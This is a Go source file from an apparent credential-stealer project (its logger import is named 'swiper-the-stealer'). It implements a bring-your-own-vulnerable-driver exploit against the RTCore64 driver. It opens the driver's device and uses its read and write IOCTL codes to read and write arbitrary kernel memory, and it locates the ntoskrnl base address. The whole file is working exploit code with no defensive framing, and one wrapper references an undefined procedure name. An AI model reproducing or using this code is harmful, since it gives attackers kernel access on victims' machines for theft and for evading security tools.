package byovd

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"swiper-the-stealer/pkg/logger"
)

// Enhanced RTCore exploit with your working memory primitives (EXACT from your main.go)

// RTCoreEnhancedExploit - Enhanced RTCore64 exploit with advanced memory operations
type RTCoreEnhancedExploit struct {
	device windows.Handle
	logger *logger.Logger
}

// Windows API function declarations (EXACT from your main.go)
var (
	modKernelEnh             = windows.NewLazySystemDLL("kernel32.dll")
	procDeviceIoControlEnh     = modKernelEnh.NewProc("DeviceIoControl")
	procCreateFileWEnh         = modKernelEnh.NewProc("CreateFileW")
	procCloseHandleEnh         = modKernelEnh.NewProc("CloseHandle")
	procGetCurrentProcessIdEnh = modKernelEnh.NewProc("GetCurrentProcessId")
	procCreateProcessWEnh      = modKernelEnh.NewProc("CreateProcessW")
	procWaitForSingleObjectEnh = modKernelEnh.NewProc("WaitForSingleObject")
	modPsapiEnh                = windows.NewLazySystemDLL("psapi.dll")
	procEnumDeviceDriversEnh   = modPsapiEnh.NewProc("EnumDeviceDrivers")
)

// RTCORE64 memory structures (EXACT from your main.go)
type RTCORE64_MEMORY_READ struct {
	Pad0     [8]byte
	Address  uint64
	Pad1     [8]byte
	ReadSize uint32
	Value    uint32
	Pad3     [16]byte
}

type RTCORE64_MEMORY_WRITE struct {
	Pad0     [8]byte
	Address  uint64
	Pad1     [8]byte
	ReadSize uint32
	Value    uint32
	Pad3     [16]byte
}

// RTCore64 IOCTL codes
const (
	RTCORE64_MEMORY_READ_CODE  = 0x80002048
	RTCORE64_MEMORY_WRITE_CODE = 0x8000204c
)

// NewRTCoreEnhancedExploit - Create enhanced RTCore exploit instance
func NewRTCoreEnhancedExploit(logger *logger.Logger) (*RTCoreEnhancedExploit, error) {
	// Open RTCore64 device
	device, err := CreateFileW(
		`\\.\RTCore64`,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0,
		nil,
		windows.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		return nil, fmt.Errorf("unable to obtain handle to RTCore64 device: %v", err)
	}

	logger.Infof("RTCore64 device handle obtained successfully")

	return &RTCoreEnhancedExploit{
		device: device,
		logger: logger,
	}, nil
}

// Close - Clean up RTCore device handle
func (r *RTCoreEnhancedExploit) Close() error {
	if r.device != 0 {
		return CloseHandle(r.device)
	}
	return nil
}

// DeviceIoControl - Windows API wrapper (EXACT from your main.go)
func DeviceIoControl(hDevice windows.Handle, ioControlCode uint32, inBuffer *byte, inBufferSize uint32, outBuffer *byte, outBufferSize uint32, bytesReturned *uint32, overlapped *windows.Overlapped) (err error) {
	r1, _, e1 := syscall.Syscall9(procDeviceIoControlEnh.Addr(), 9, uintptr(hDevice), uintptr(ioControlCode), uintptr(unsafe.Pointer(inBuffer)), uintptr(inBufferSize), uintptr(unsafe.Pointer(outBuffer)), uintptr(outBufferSize), uintptr(unsafe.Pointer(bytesReturned)), uintptr(unsafe.Pointer(overlapped)), 0)
	if r1 == 0 {
		return e1
	}
	return nil
}

// CreateFileW - Windows API wrapper (EXACT from your main.go)
func CreateFileW(lpFileName string, dwDesiredAccess uint32, dwShareMode uint32, lpSecurityAttributes *windows.SecurityAttributes, dwCreationDisposition uint32, dwFlagsAndAttributes uint32, hTemplateFile windows.Handle) (handle windows.Handle, err error) {
	r1, _, e1 := syscall.Syscall9(procCreateFileWEnh.Addr(), 7, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(lpFileName))), uintptr(dwDesiredAccess), uintptr(dwShareMode), uintptr(unsafe.Pointer(lpSecurityAttributes)), uintptr(dwCreationDisposition), uintptr(dwFlagsAndAttributes), uintptr(hTemplateFile), 0, 0)
	handle = windows.Handle(r1)
	if handle == windows.InvalidHandle {
		err = e1
	}
	return
}

// CloseHandle - Windows API wrapper (EXACT from your main.go)
func CloseHandle(hObject windows.Handle) (err error) {
	r1, _, e1 := syscall.Syscall(procCloseHandle.Addr(), 1, uintptr(hObject), 0, 0)
	if r1 == 0 {
		err = e1
	}
	return
}

// GetCurrentProcessId - Windows API wrapper (EXACT from your main.go)
func GetCurrentProcessId() (id uint32) {
	r0, _, _ := syscall.Syscall(procGetCurrentProcessIdEnh.Addr(), 0, 0, 0, 0)
	id = uint32(r0)
	return
}

// EnumDeviceDrivers - Windows API wrapper (EXACT from your main.go)
func EnumDeviceDrivers(lpImageBase *uintptr, cb uint32, lpcbNeeded *uint32) (err error) {
	r1, _, e1 := syscall.Syscall(procEnumDeviceDriversEnh.Addr(), 3, uintptr(unsafe.Pointer(lpImageBase)), uintptr(cb), uintptr(unsafe.Pointer(lpcbNeeded)))
	if r1 == 0 {
		err = e1
	}
	return
}

// GetNtoskrnlBase - Get ntoskrnl.exe base address (EXACT from your main.go)
func (r *RTCoreEnhancedExploit) GetNtoskrnlBase() (uint64, error) {
	var drivers [1024]uintptr
	var cbNeeded uint32
	err := EnumDeviceDrivers(&drivers[0], uint32(len(drivers))*uint32(unsafe.Sizeof(drivers[0])), &cbNeeded)
	if err != nil {
		return 0, err
	}
	if uintptr(cbNeeded) > uintptr(len(drivers))*unsafe.Sizeof(drivers[0]) {
		return 0, fmt.Errorf("buffer too small")
	}
	
	ntoskrnlBase := uint64(drivers[0])
	r.logger.Infof("Ntoskrnl base address: 0x%X", ntoskrnlBase)
	return ntoskrnlBase, nil
}

// ReadMemoryPrimitive - Read kernel memory primitive (EXACT from your main.go)
func (r *RTCoreEnhancedExploit) ReadMemoryPrimitive(size uint32, address uint64) (uint32, error) {
	memoryRead := RTCORE64_MEMORY_READ{
		Address:  address,
		ReadSize: size,
	}
	var bytesReturned uint32
	err := DeviceIoControl(
		r.device,
		RTCORE64_MEMORY_READ_CODE,
		(*byte)(unsafe.Pointer(&memoryRead)),
		uint32(unsafe.Sizeof(memoryRead)),
		(*byte)(unsafe.Pointer(&memoryRead)),
		uint32(unsafe.Sizeof(memoryRead)),
		&bytesReturned,
		nil,
	)
	if err != nil {
		return 0, err
	}
	return memoryRead.Value, nil
}

// WriteMemoryPrimitive - Write kernel memory primitive (EXACT from your main.go)
func (r *RTCoreEnhancedExploit) WriteMemoryPrimitive(size uint32, address uint64, value uint32) error {
	memoryWrite := RTCORE64_MEMORY_WRITE{
		Address:  address,
		ReadSize: size,
		Value:    value,
	}
	var bytesReturned uint32
	err := DeviceIoControl(
		r.device,
		RTCORE64_MEMORY_WRITE_CODE,
		(*byte)(unsafe.Pointer(&memoryWrite)),
		uint32(unsafe.Sizeof(memoryWrite)),
		(*byte)(unsafe.Pointer(&memoryWrite)),
		uint32(unsafe.Sizeof(memoryWrite)),
		&bytesReturned,
		nil,
	)
	return err
}

// ReadMemoryDWORD - Read 32-bit value (EXACT from your main.go)
func (r *RTCoreEnhancedExploit) ReadMemoryDWORD(address uint64) (uint32, error) {
	return r.ReadMemoryPrimitive(4, address)
}

// ReadMemoryDWORD64 - Read 64-bit value (EXACT from your main.go)
func (r *RTCoreEnhancedExploit) ReadMemoryDWORD64(address uint64) (uint64, error) {
	low, err := r.ReadMemoryDWORD(address)
	if err != nil {
		return 0, err
	}
	high, err := r.ReadMemoryDWORD(address + 4)
	if err != nil {
		return 0, err
	}
	return uint64(high)<<32 | uint64(low), nil
}

// WriteMemoryDWORD64 - Write 64-bit value (EXACT from your main.go)
func (r *RTCoreEnhancedExploit) WriteMemoryDWORD64(address uint64, value uint64) error {
	err := r.WriteMemoryPrimitive(4, address, uint32(value))
	if err != nil {
		return err
	}
	return r.WriteMemoryPrimitive(4, address+4, uint32(value>>32))
}

// ReadMemory - Read arbitrary length memory (EXACT from your main.go)
func (r *RTCoreEnhancedExploit) ReadMemory(address uint64, buffer []byte) error {
	for i := 0; i < len(buffer); i += 4 {
		remaining := len(buffer) - i
		readSize := 4
		if remaining < 4 {
			readSize = remaining
		}

		val, err := r.ReadMemoryPrimitive(uint32(readSize), address+uint64(i))
		if err != nil {
			return err
		}

		for j := 0; j < readSize; j++ {
			buffer[i+j] = byte(val >> (j * 8))
		}
	}
	return nil
}

// GetDevice - Get the underlying device handle
func (r *RTCoreEnhancedExploit) GetDevice() windows.Handle {
	return r.device
}

// GetCurrentProcessId - Get current process ID (EXACT from your main.go)
func (r *RTCoreEnhancedExploit) GetCurrentProcessId() uint32 {
	return GetCurrentProcessId()
}
